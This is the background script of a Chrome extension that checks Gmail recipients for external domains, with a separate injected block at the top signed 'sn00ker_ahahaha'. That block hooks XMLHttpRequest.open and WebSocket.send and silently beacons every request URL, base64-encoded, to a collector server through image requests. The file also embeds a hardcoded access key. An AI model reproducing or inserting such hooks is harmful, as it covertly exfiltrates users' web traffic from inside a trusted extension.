function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var CONFIG_BASE = 'jp.cloudstep.safety.config.';
var accesskey = 'XaI0on2HWOPj7It4NHZfABU0U34TN3IzPWYLOAxLeCgu';
var serverUrl = 'https://safe-gmail.appspot.com';

var localValue = {"action_disp_message1": "すべての宛先を Bcc に移動して送信する", "action_disp_message2": "送信しない", "action_disp_message3": "送信する", "action_use_flg1": "true", "action_use_flg2": "true", "action_use_flg3": "true", "alert_message": "ドメイン外の宛先が複数指定されています。このまま送信してもよろしいですか？", "btn_ok_caption": "OK", "btn_cl_use": "true", "btn_cl_caption": "キャンセル", "external_domain_check": 2, "opt_alert3rd": "true", "opt_check_bcc": "true", "opt_default_bcc": "false", "opt_highlight": "true", "opt_autocomplete_hide": "false", "add_cc01": "false", "opt_link_invalid": "false", "opt_recipientchecker": "false", "opt_subject": "false", "tenant_domain_list": "-", "version": 1};

var disp_error_flg = false;
var res_flg = {};

chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {
    try{
      switch (request.command) {
        case 'setItem':
          localStorage.setItem(CONFIG_BASE + request.key, request.val);
          return;
        case 'getItem':
          sendResponse( localStorage.getItem(CONFIG_BASE + request.key) );
          return;
        case 'getAllKeyConfig':
          var res = CONFIG_KEY_ARR;
          for( var key in CONFIG_KEY_ARR ) {
            var confVal = localStorage.getItem(CONFIG_BASE + key);
            if(confVal != null){
              res[key] = confVal;
            }
          }
          sendResponse( res );
          return;
        case 'getAllKey':
          plan = nvl(localStorage.getItem(CONFIG_BASE + 'FREE_PLAN.' + request.key), '');
console.debug( "Send Checker Check Server", request.key, plan );
          //-- サーバに問合せ ----
          if (plan != 'true' && domain(request.key) != 'gmail.com' && filter(request.url)) {
            $.getJSON(serverUrl + '/getPolicy_json?v=' + chrome.runtime.getManifest().version + '&k=' + request.key + '&s=' + accesskey + '&u=' + request.url, function(json){

console.debug( " Server Response", json );
              for(var k in json) {
                localStorage.setItem(CONFIG_BASE + 'policy.' + request.key + '.' + k, json[k]);
              }
              if( json['result'] == 'error' ) {
                localStorage.setItem(CONFIG_BASE + 'FREE_PLAN.' + request.key, "true");
              }
              res_flg[request.key] = 'ok';
              return;
            });
            if( res_flg[request.key] == 'ok' ) {
              sendResponse( makePolicyResponse(request.key) );
            }
          } else {
            sendResponse(makePolicyResponse(request.key));
          }
          return;
        case 'setValue':
          localValue[request.key] = request.val;
          return;
        case 'getValue':
          sendResponse( localValue[request.key] );
          return;
        case 'clearLoadFlag':
          for (var i = 0; i < localStorage.length; i++) {
            var name = localStorage.key(i);
            
            if (name.indexOf(CONFIG_BASE + 'FREE_PLAN') == 0) {
              localStorage.setItem(name, '');
              console.debug('clear: ' + name);
            }
          }
          res_flg = {};
          return;
      }
    } catch( e ) {
      if ( ! disp_error_flg) {
        disp_error_flg = true;
        console.debug( e );
      }
      return false;
    }
  }
);

function filter(href) {
  var skip = [
    'view=om&th=',
    'view=ac',
    'view=pt',
    'view=dom',
    '/h/',
    'mail.google.com/tasks/canvas',
    'mail.google.com/mail/mu/background',
    'mail.google.com/mail/mu/mp',
  ];
  
  for (var m in skip) {
    if (href.indexOf(skip[m]) != -1) {
      console.debug('Skip:', href);
      return false;
    }
  }
  
  return true;
}

function makePolicyResponse( key ) {

  var res = {};
  $.extend(true, res, localValue);

  res['tenant_domain_list'] = domain(key);

  for (var k in localStorage){
    baseKey = CONFIG_BASE + 'policy.' + key + '.';
    k2 = k.substr( 0, baseKey.length );
    k3 = k.substr( baseKey.length );
    if( baseKey == k2 ) {
      res[k3] = localStorage.getItem(k);
    }
  }

console.debug( " => Response", res );
  return res;
}

function nvl( v, d ) {
  if( v == null ) return d;
  return v;
}

function domain(email) {
  if (email == null) {
    return '';
  }
  
  var at = email.lastIndexOf('@');
  
  if (at == -1) {
    return '';
  }
  
  return email.substring(at + 1);
}

$.ajaxSetup({
  cache: false
});

